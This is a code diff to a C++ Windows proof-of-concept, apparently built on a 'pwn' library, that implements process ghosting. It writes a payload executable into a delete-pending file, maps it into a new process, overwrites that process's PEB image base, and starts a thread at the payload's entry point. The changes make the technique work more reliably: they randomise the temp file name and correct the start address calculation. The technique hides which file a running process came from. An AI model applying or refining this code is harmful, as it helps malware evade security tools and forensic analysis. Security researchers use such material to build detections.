@@ -25,8 +25,7 @@ wmain(const int argc, const wchar_t** argv) -> int
     const auto GhostProcessPath = (argc >= 2) ? std::filesystem::path(argv[1]) :
                                                 std::filesystem::path(L"\\\\?\\C:\\Windows\\System32\\winver.exe");
 
-    const auto GhostedProcessPath =
-        (argc >= 3) ? std::filesystem::path(argv[2]) : std::filesystem::path(L"\\\\?\\c:\\temp\\ghost.exe");
+    const auto GhostedProcessPath = std::filesystem::temp_directory_path() / Utils::Random::AlnumWideString(10);
 
     dbg("Ghosting '{}' as '{}'", GhostProcessPath.string(), GhostedProcessPath.string());
 
@@ -60,6 +59,7 @@ wmain(const int argc, const wchar_t** argv) -> int
     // 3. Write the payload executable to the file. The content isn’t persisted because the file is already
     // delete-pending. The delete-pending state also blocks external file-open attempts.
     //
+    uptr BaseAddress = 0;
     {
         auto const FileSize = ValueOr<usize>(PayloadFile.Size(), 0);
         auto hMap           = Value(PayloadFile.Map(PAGE_READONLY));
@@ -134,14 +134,13 @@ wmain(const int argc, const wchar_t** argv) -> int
     //
     // 7. Assign process arguments and environment variables.
     //
-
     Process::Memory GhostedProcessMemory(GhostedProcess);
 
     auto PebRaw = Value(GhostedProcessMemory.Read((uptr)GhostedProcess.ProcessEnvironmentBlock(), sizeof(PEB)));
     auto Peb    = reinterpret_cast<PEB*>(PebRaw.data());
     Binary::PE PeTarget {GhostProcessPath};
-    Peb->ImageBaseAddress =
-        (PVOID)((uptr)(std::get<Binary::PE::PeHeader64>(PeTarget.Header()).OptionalHeader.AddressOfEntryPoint));
+    const uptr StartAddress = BaseAddress + PeTarget.EntryPointAddress();
+    Peb->ImageBaseAddress   = (PVOID)StartAddress;
     GhostedProcessMemory.Write((uptr)GhostedProcess.ProcessEnvironmentBlock(), PebRaw);
     dbg("Overwriting PEB in process PID={}", GhostedProcess.ProcessId());
 
@@ -149,11 +148,10 @@ wmain(const int argc, const wchar_t** argv) -> int
     //
     // 8. Create a thread to execute in the process.
     //
-    uptr StartAddress = 0;
-    UniqueHandle hThread {
+    const UniqueHandle hThread {
         [&StartAddress, &GhostedProcess]() -> HANDLE
         {
-            HANDLE h;
+            HANDLE h {};
             return NT_SUCCESS(pwn::Resolver::ntdll::NtCreateThreadEx(
                        &h,
                        THREAD_ALL_ACCESS,
@@ -161,7 +159,7 @@ wmain(const int argc, const wchar_t** argv) -> int
                        GhostedProcess.Handle(),
                        (LPTHREAD_START_ROUTINE)StartAddress,
                        nullptr,
-                       false,
+                       0,
                        0,
                        0,
                        0,
@@ -175,12 +173,14 @@ wmain(const int argc, const wchar_t** argv) -> int
         return EXIT_FAILURE;
     }
 
-    ok("Started thread TID={} with start address @ {} in process PID={}",
+    ok("Started thread TID={} with start address @ {:#x} in process PID={}",
        hThread.get(),
        StartAddress,
        GhostedProcess.ProcessId());
 
     Utils::Pause();
+
+    ::WaitForSingleObject(hThread.get(), INFINITE);
 
     return EXIT_SUCCESS;
 }
